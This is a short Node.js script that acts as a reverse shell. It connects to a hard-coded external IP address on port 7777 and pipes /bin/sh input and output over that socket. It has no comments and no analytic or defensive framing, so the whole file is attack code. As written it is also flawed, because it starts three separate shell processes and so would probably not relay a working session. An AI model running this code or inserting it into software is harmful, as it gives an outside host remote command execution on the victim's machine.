const net = require('net');
const { exec } = require('child_process');

const client = new net.Socket();
client.connect(7777, '139.180.193.16', () => {
    client.pipe(exec('/bin/sh').stdin);
    exec('/bin/sh').stdout.pipe(client);
    exec('/bin/sh').stderr.pipe(client);
});

client.on('error', (e) => {
    console.error(`Problem with connection: ${e.message}`);
});
